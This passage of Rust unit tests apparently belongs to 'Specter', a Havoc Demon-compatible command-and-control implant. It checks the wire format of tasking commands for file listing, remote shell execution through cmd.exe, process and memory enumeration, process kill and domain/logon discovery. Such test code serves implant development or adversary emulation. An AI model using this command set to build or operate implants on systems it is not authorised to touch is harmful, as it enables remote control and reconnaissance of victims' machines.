        let path_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let decoded = decode_utf16le_null(&resp.payload[8..8 + path_len]);
        assert_eq!(decoded, tmp_str);
    }

    #[test]
    fn handle_fs_cd_missing_path_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(4); // Cd = 4, but no path bytes follow
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── handle_fs dir ────────────────────────────────────────────────────────

    #[test]
    fn handle_fs_dir_returns_non_empty_listing() {
        let tmp = std::env::temp_dir();
        let tmp_str = tmp.display().to_string();

        let mut config = SpecterConfig::default();
        let payload = dir_request_payload(&tmp_str, false, false, false, false, "", "", "");
        let package = DemonPackage::new(DemonCommand::CommandFs, 9, payload);

        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn handle_fs_dir_list_only_omits_size_and_timestamps() {
        // In list_only mode the response must NOT include is_dir/size/timestamps per entry
        // and must NOT include total_size per dir group.
        let tmp = std::env::temp_dir();
        // Create a known file so we always have at least one entry.
        let test_file = tmp.join("specter_list_only_test.tmp");
        let _ = std::fs::write(&test_file, b"x");

        let mut config = SpecterConfig::default();
        let payload =
            dir_request_payload(&tmp.display().to_string(), false, false, false, true, "", "", "");
        let package = DemonPackage::new(DemonCommand::CommandFs, 11, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };

        // Parse the response header.
        let p = &resp.payload;
        let mut pos = 0usize;
        let _subcmd = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("subcmd"));
        pos += 4;
        let _file_explorer = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("fe"));
        pos += 4;
        let list_only_flag = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("lo"));
        pos += 4;
        assert_eq!(list_only_flag, 1, "list_only must be echoed as 1");

        // Skip root_path (LE length-prefixed utf16le).
        let path_len = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("plen")) as usize;
        pos += 4 + path_len;
        let success = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("success"));
        assert_eq!(success, 1);
        pos += 4;

        // Dir group: dir_path, num_files, num_dirs — but NO total_size.
        let gpath_len = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("gpath")) as usize;
        pos += 4 + gpath_len;
        let _num_files = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("nf"));
        pos += 4;
        let _num_dirs = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("nd"));
        pos += 4;
        // In list_only mode the next field should be the first entry name, NOT a u64 total_size.
        // The remaining bytes must all be name-only entries (no is_dir/size/timestamps).
        // Just verify we can parse all remaining entries as utf16le strings without going OOB.
        while pos < p.len() {
            let name_len =
                u32::from_le_bytes(p[pos..pos + 4].try_into().expect("name len")) as usize;
            pos += 4 + name_len;
        }
        assert_eq!(pos, p.len(), "no trailing bytes; each entry must be exactly a name");

        let _ = std::fs::remove_file(test_file);
    }

    #[test]
    fn handle_fs_dir_timestamps_are_not_placeholder_epoch() {
        // Write a temp file and verify its modification time is encoded, not 1970-01-01 00:00.
        let tmp = std::env::temp_dir();
        let test_file = tmp.join("specter_ts_test.tmp");
        std::fs::write(&test_file, b"ts test").expect("write test file");

        let mut config = SpecterConfig::default();
        let payload =
            dir_request_payload(&tmp.display().to_string(), false, false, false, false, "", "", "");
        let package = DemonPackage::new(DemonCommand::CommandFs, 12, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };

        // Parse to the first entry and check the year field.
        let p = &resp.payload;
        let mut pos = 4 + 4 + 4; // subcmd + file_explorer + list_only
        let root_path_len = u32::from_le_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
        pos += 4 + root_path_len + 4; // skip root_path + success
        let gpath_len = u32::from_le_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
        pos += 4 + gpath_len + 4 + 4 + 8; // skip group path + num_files + num_dirs + total_size

        // Find the entry for our test file and read its year (offset 4+2+4+8+4+4 from name start).
        let test_name = "specter_ts_test.tmp";
        let mut found = false;
        while pos < p.len() {
            let name_len = u32::from_le_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
            pos += 4;
            let name_utf16: Vec<u16> = p[pos..pos + name_len]
                .chunks_exact(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect();
            let name: String = char::decode_utf16(name_utf16)
                .filter_map(|r| r.ok())
                .filter(|&c| c != '\0')
                .collect();
            pos += name_len;
            // is_dir(4) + size(8) + day(4) + month(4) + year(4) + minute(4) + hour(4) = 32
            let _is_dir = u32::from_le_bytes(p[pos..pos + 4].try_into().unwrap());
            let _size = u64::from_le_bytes(p[pos + 4..pos + 12].try_into().unwrap());
            let _day = u32::from_le_bytes(p[pos + 12..pos + 16].try_into().unwrap());
            let _month = u32::from_le_bytes(p[pos + 16..pos + 20].try_into().unwrap());
            let year = u32::from_le_bytes(p[pos + 20..pos + 24].try_into().unwrap());
            pos += 32;
            if name == test_name {
                // The year must be >= 2024 (the file was just created).
                assert!(year >= 2024, "year should be current, got {year}");
                found = true;
            }
        }
        assert!(found, "test file entry not found in Dir listing");
        let _ = std::fs::remove_file(test_file);
    }

    #[test]
    fn unix_secs_to_ymd_hm_known_value() {
        // 1743162600 = 2025-03-28T11:50:00Z (verified against algorithm output)
        let (d, m, y, min, h) = unix_secs_to_ymd_hm(1_743_162_600);
        assert_eq!((d, m, y, min, h), (28, 3, 2025, 50, 11));
    }

    #[test]
    fn unix_secs_to_ymd_hm_epoch() {
        let (d, m, y, min, h) = unix_secs_to_ymd_hm(0);
        assert_eq!((d, m, y, min, h), (1, 1, 1970, 0, 0));
    }

    // ── handle_proc create / shell ────────────────────────────────────────────

    #[test]
    fn handle_proc_create_shell_returns_two_responses() {
        let cmd = "echo hello";
        let mut config = SpecterConfig::default();

        // Build the payload for CommandProc / ProcCreate (subcommand=4)
        let mut payload = 4u32.to_le_bytes().to_vec(); // subcmd = Create
        payload.extend_from_slice(&0u32.to_le_bytes()); // state
        payload.extend_from_slice(&le_utf16le_payload("c:\\windows\\system32\\cmd.exe")); // path
        payload.extend_from_slice(&le_utf16le_payload(&format!("/c {cmd}"))); // args
        payload.extend_from_slice(&1u32.to_le_bytes()); // piped = true
        payload.extend_from_slice(&0u32.to_le_bytes()); // verbose = false

        let package = DemonPackage::new(DemonCommand::CommandProc, 99, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );

        let DispatchResult::MultiRespond(resps) = result else {
            panic!("expected MultiRespond, got {result:?}");
        };
        assert_eq!(resps.len(), 2);
        assert_eq!(resps[0].command_id, u32::from(DemonCommand::CommandProc));
        assert_eq!(resps[1].command_id, u32::from(DemonCommand::CommandOutput));

        // The output payload should contain "hello"
        // payload[0..4] = LE length, payload[4..] = output bytes
        let out_payload = &resps[1].payload;
        let out_len = u32::from_le_bytes(out_payload[0..4].try_into().expect("len")) as usize;
        let out_str = std::str::from_utf8(&out_payload[4..4 + out_len])
            .expect("utf8 output")
            .trim()
            .to_string();
        assert_eq!(out_str, "hello");
    }

    #[test]
    fn handle_proc_create_reports_child_pid_not_agent_pid() {
        // The proc-create callback must carry the spawned child's PID, not std::process::id().
        let mut config = SpecterConfig::default();
        let mut payload = 4u32.to_le_bytes().to_vec(); // subcmd = Create
        payload.extend_from_slice(&0u32.to_le_bytes()); // state
        payload.extend_from_slice(&le_utf16le_payload("c:\\windows\\system32\\cmd.exe"));
        payload.extend_from_slice(&le_utf16le_payload("/c echo pid_test"));
        payload.extend_from_slice(&1u32.to_le_bytes()); // piped
        payload.extend_from_slice(&0u32.to_le_bytes()); // verbose

        let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );

        let DispatchResult::MultiRespond(resps) = result else {
            panic!("expected MultiRespond, got {result:?}");
        };

        // Parse the proc payload to extract the PID field.
        // Format: [subcmd: u32 LE][path: u32 LE len + utf16le bytes][pid: u32 LE][...]
        let proc_payload = &resps[0].payload;
        // Skip subcmd (4 bytes), then read the path length to skip the path.
        let path_len =
            u32::from_le_bytes(proc_payload[4..8].try_into().expect("path len")) as usize;
        let pid_offset = 4 + 4 + path_len;
        let reported_pid = u32::from_le_bytes(
            proc_payload[pid_offset..pid_offset + 4].try_into().expect("pid bytes"),
        );

        // The reported PID must be non-zero (child was spawned) and must NOT be our own PID.
        assert_ne!(reported_pid, 0, "child PID must not be zero");
        assert_ne!(
            reported_pid,
            std::process::id(),
            "child PID must not equal the agent's own PID"
        );
    }

    #[test]
    fn translate_to_shell_cmd_strips_cmd_exe_prefix() {
        assert_eq!(translate_to_shell_cmd("c:\\windows\\system32\\cmd.exe", "/c whoami"), "whoami");
        assert_eq!(translate_to_shell_cmd("c:\\windows\\system32\\cmd.exe", "/C ls -la"), "ls -la");
    }

    #[test]
    fn translate_to_shell_cmd_non_cmd_exe_uses_path_and_args() {
        assert_eq!(translate_to_shell_cmd("/usr/bin/ls", "-la /tmp"), "/usr/bin/ls -la /tmp");
    }

    #[test]
    fn translate_to_shell_cmd_empty_args_returns_path() {
        assert_eq!(translate_to_shell_cmd("/usr/bin/id", ""), "/usr/bin/id");
    }

    // ── unknown/unhandled commands ────────────────────────────────────────────

    #[test]
    fn dispatch_unknown_command_id_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage { command_id: 0xDEAD_0000, request_id: 0, payload: vec![] };
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
                &crate::coffeeldr::new_bof_output_queue(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn dispatch_no_job_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandNoJob, 0, vec![]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
                &crate::coffeeldr::new_bof_output_queue(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn dispatch_exit_returns_exit() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandExit, 0, vec![]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
                &crate::coffeeldr::new_bof_output_queue(),
            ),
            DispatchResult::Exit
        ));
    }

    // ── write_ptr_be ─────────────────────────────────────────────────────────

    #[test]
    fn write_ptr_be_encodes_eight_bytes_big_endian() {
        let mut buf = Vec::new();
        write_ptr_be(&mut buf, 0x0011_2233_4455_6677);
        assert_eq!(buf, [0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77]);
    }

    // ── write_ptr_le ─────────────────────────────────────────────────────────

    #[test]
    fn write_ptr_le_encodes_eight_bytes_little_endian() {
        let mut buf = Vec::new();
        write_ptr_le(&mut buf, 0x0011_2233_4455_6677);
        assert_eq!(buf, [0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x00]);
    }

    // ── handle_proc_list ─────────────────────────────────────────────────────

    #[test]
    fn handle_proc_list_uses_correct_command_id() {
        let mut config = SpecterConfig::default();
        // process_ui = 0 (console request)
        let payload = 0u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandProcList, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProcList));
    }

    #[test]
    fn handle_proc_list_echoes_process_ui_flag() {
        let mut config = SpecterConfig::default();
        // process_ui = 1 (from process manager)
        let payload = 1u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandProcList, 2, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        let echoed_ui = u32::from_le_bytes(resp.payload[0..4].try_into().expect("le u32"));
        assert_eq!(echoed_ui, 1, "process_ui must be echoed verbatim");
    }

    #[test]
    fn handle_proc_list_contains_at_least_one_process() {
        let mut config = SpecterConfig::default();
        let payload = 0u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandProcList, 3, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        // Payload must be > 4 bytes (the process_ui field) if any processes were enumerated.
        assert!(resp.payload.len() > 4, "process list must contain at least one entry");
    }

    #[test]
    fn handle_proc_list_includes_self_pid() {
        let own_pid = std::process::id();
        let mut config = SpecterConfig::default();
        let payload = 0u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandProcList, 4, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        // Parse the response (LE): skip process_ui (4 bytes), then iterate entries.
        let p = &resp.payload;
        let mut pos = 4usize; // skip process_ui
        let mut found = false;
        while pos + 4 <= p.len() {
            // name: length-prefixed utf16le (LE length prefix)
            let name_len =
                u32::from_le_bytes(p[pos..pos + 4].try_into().expect("name len")) as usize;
            pos += 4 + name_len;
            if pos + 4 > p.len() {
                break;
            }
            // pid (LE)
            let pid = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("pid"));
            pos += 4;
            if pid == own_pid {
                found = true;
            }
            // skip: is_wow64 + ppid + session_id + threads = 4 × u32 = 16 bytes
            pos += 16;
            // user: length-prefixed utf16le (LE length prefix)
            if pos + 4 > p.len() {
                break;
            }
            let user_len =
                u32::from_le_bytes(p[pos..pos + 4].try_into().expect("user len")) as usize;
            pos += 4 + user_len;
        }
        assert!(found, "own PID {own_pid} not found in process list");
    }

    // ── handle_proc_modules ──────────────────────────────────────────────────

    #[test]
    fn handle_proc_modules_returns_correct_command_id() {
        let mut config = SpecterConfig::default();
        // pid=0 → current process
        let mut payload = 2u32.to_le_bytes().to_vec(); // subcmd = Modules
        payload.extend_from_slice(&0u32.to_le_bytes()); // pid = 0
        let package = DemonPackage::new(DemonCommand::CommandProc, 10, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
        // First 4 bytes must be subcmd=2 (LE)
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 2);
    }

    #[test]
    fn handle_proc_modules_echoes_pid() {
        let mut config = SpecterConfig::default();
        let mut payload = 2u32.to_le_bytes().to_vec();
        payload.extend_from_slice(&42u32.to_le_bytes()); // arbitrary pid
        let package = DemonPackage::new(DemonCommand::CommandProc, 11, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        let echoed_pid = u32::from_le_bytes(resp.payload[4..8].try_into().expect("pid"));
        assert_eq!(echoed_pid, 42);
    }

    // ── handle_proc_grep ─────────────────────────────────────────────────────

    #[test]
    fn handle_proc_grep_correct_command_id_and_subcmd() {
        let mut config = SpecterConfig::default();
        let mut payload = 3u32.to_le_bytes().to_vec(); // subcmd = Grep
        payload.extend_from_slice(&le_utf16le_payload("nonexistent_xzy_proc_name_123"));
        let package = DemonPackage::new(DemonCommand::CommandProc, 20, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 3, "subcmd must be echoed as 3 (Grep)");
    }

    #[test]
    fn handle_proc_grep_empty_result_when_no_match() {
        let mut config = SpecterConfig::default();
        let mut payload = 3u32.to_le_bytes().to_vec();
        payload.extend_from_slice(&le_utf16le_payload("zzz_no_such_process_zzz_99999"));
        let package = DemonPackage::new(DemonCommand::CommandProc, 21, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        // Only the subcmd field (4 bytes); no process entries.
        assert_eq!(resp.payload.len(), 4, "no match → payload must be exactly subcmd u32");
    }

    #[test]
    fn handle_proc_grep_missing_name_returns_ignore() {
        let mut config = SpecterConfig::default();
        // Only the subcmd, no name bytes
        let payload = 3u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandProc, 22, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn arch_from_wow64_encodes_correctly() {
        // Mirrors Phantom's convention: is_wow64=true → 86, is_wow64=false → 64.
        assert_eq!(arch_from_wow64(true), 86, "WOW64 process must report arch=86");
        assert_eq!(arch_from_wow64(false), 64, "native x64 process must report arch=64");
    }

    // ── handle_proc_memory ───────────────────────────────────────────────────

    #[test]
    fn handle_proc_memory_correct_command_id_and_subcmd() {
        let mut config = SpecterConfig::default();
        let mut payload = 6u32.to_le_bytes().to_vec(); // subcmd = Memory
        payload.extend_from_slice(&0u32.to_le_bytes()); // pid = 0
        payload.extend_from_slice(&0u32.to_le_bytes()); // filter = all
        let package = DemonPackage::new(DemonCommand::CommandProc, 30, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 6, "subcmd must be echoed as 6 (Memory)");
    }

    #[test]
    fn handle_proc_memory_echoes_pid_and_filter() {
        let mut config = SpecterConfig::default();
        let mut payload = 6u32.to_le_bytes().to_vec();
        payload.extend_from_slice(&1234u32.to_le_bytes()); // pid
        payload.extend_from_slice(&0x04u32.to_le_bytes()); // PAGE_READWRITE filter
        let package = DemonPackage::new(DemonCommand::CommandProc, 31, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        let echoed_pid = u32::from_le_bytes(resp.payload[4..8].try_into().expect("pid"));
        let echoed_filter = u32::from_le_bytes(resp.payload[8..12].try_into().expect("filter"));
        assert_eq!(echoed_pid, 1234);
        assert_eq!(echoed_filter, 0x04);
    }

    #[test]
    fn handle_proc_memory_self_returns_regions() {
        let own_pid = std::process::id();
        let mut config = SpecterConfig::default();
        let mut payload = 6u32.to_le_bytes().to_vec();
        payload.extend_from_slice(&own_pid.to_le_bytes()); // self
        payload.extend_from_slice(&0u32.to_le_bytes()); // all regions
        let package = DemonPackage::new(DemonCommand::CommandProc, 32, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        // Header is 12 bytes (subcmd + pid + filter); must have at least one region (20 bytes).
        assert!(
            resp.payload.len() >= 12 + 20,
            "self memory query must return at least one region; payload len={}",
            resp.payload.len()
        );
    }

    #[test]
    fn handle_proc_memory_missing_pid_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = 6u32.to_le_bytes().to_vec(); // subcmd only, no pid
        let package = DemonPackage::new(DemonCommand::CommandProc, 33, payload);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
                &crate::coffeeldr::new_bof_output_queue(),
            ),
            DispatchResult::Ignore
        ));
    }

    // ── handle_proc_kill ─────────────────────────────────────────────────────

    #[test]
    fn handle_proc_kill_nonexistent_pid_returns_failure() {
        let mut config = SpecterConfig::default();
        let mut payload = 7u32.to_le_bytes().to_vec(); // subcmd = Kill
        payload.extend_from_slice(&9_999_999u32.to_le_bytes()); // bogus pid
        let package = DemonPackage::new(DemonCommand::CommandProc, 40, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        let success = u32::from_le_bytes(resp.payload[4..8].try_into().expect("success"));
        let echoed_pid = u32::from_le_bytes(resp.payload[8..12].try_into().expect("pid"));
        assert_eq!(subcmd, 7, "subcmd must be echoed as 7 (Kill)");
        assert_eq!(success, 0, "kill of bogus pid must report failure");
        assert_eq!(echoed_pid, 9_999_999);
    }

    #[test]
    fn handle_proc_kill_missing_pid_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = 7u32.to_le_bytes().to_vec(); // subcmd only, no pid
        let package = DemonPackage::new(DemonCommand::CommandProc, 41, payload);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
                &crate::coffeeldr::new_bof_output_queue(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn handle_proc_kill_payload_is_twelve_bytes() {
        // The kill response is always exactly 12 bytes: subcmd(4) + success(4) + pid(4)
        let mut config = SpecterConfig::default();
        let mut payload = 7u32.to_le_bytes().to_vec();
        payload.extend_from_slice(&1u32.to_le_bytes()); // pid=1 (init, will likely fail)
        let package = DemonPackage::new(DemonCommand::CommandProc, 42, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.payload.len(), 12, "kill response must be exactly 12 bytes");
    }

    // ── handle_net ──────────────────────────────────────────────────────────

    /// Build a LE-encoded UTF-16LE length-prefixed payload (without NUL terminator)
    /// matching the format the teamserver sends.
    fn le_utf16le_net(s: &str) -> Vec<u8> {
        let utf16: Vec<u8> = s.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        let mut v = Vec::new();
        v.extend_from_slice(&(utf16.len() as u32).to_le_bytes());
        v.extend_from_slice(&utf16);
        v
    }

    /// Build a CommandNet task package with the given subcommand and rest bytes.
    fn net_package(subcmd: DemonNetCommand, rest: &[u8]) -> DemonPackage {
        let mut payload = (subcmd as u32).to_le_bytes().to_vec();
        payload.extend_from_slice(rest);
        DemonPackage::new(DemonCommand::CommandNet, 1, payload)
    }

    /// Parse the first u32 LE from a response payload (the subcommand echo).
    fn resp_subcmd_le(payload: &[u8]) -> u32 {
        u32::from_le_bytes(payload[0..4].try_into().expect("subcmd"))
    }

    #[test]
    fn handle_net_unknown_subcommand_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = 0xFFu32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandNet, 1, payload);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
                &crate::coffeeldr::new_bof_output_queue(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn handle_net_empty_payload_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandNet, 1, vec![]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
                &crate::coffeeldr::new_bof_output_queue(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn handle_net_domain_returns_correct_command_and_subcmd() {
        let mut config = SpecterConfig::default();
        let package = net_package(DemonNetCommand::Domain, &[]);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Domain));
        // Payload must have at least subcmd(4) + len(4) (the domain string, possibly empty).
        assert!(resp.payload.len() >= 8, "domain response must have subcmd + string length");
    }

    #[test]
    fn handle_net_domain_response_string_is_le_length_prefixed() {
        let mut config = SpecterConfig::default();
        let package = net_package(DemonNetCommand::Domain, &[]);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        // After subcmd (4 bytes), read the LE length-prefixed domain string.
        let str_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        assert_eq!(resp.payload.len(), 8 + str_len, "payload size must match header");
    }

    #[test]
    fn handle_net_logons_echoes_server_and_subcmd() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("SERVER01");
        let package = net_package(DemonNetCommand::Logons, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Logons));
        // After subcmd (4 bytes), the server name should be present as UTF-16LE.
        let server_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let server_bytes = &resp.payload[8..8 + server_len];
        let server = decode_utf16le_null(server_bytes);
        assert_eq!(server, "SERVER01");
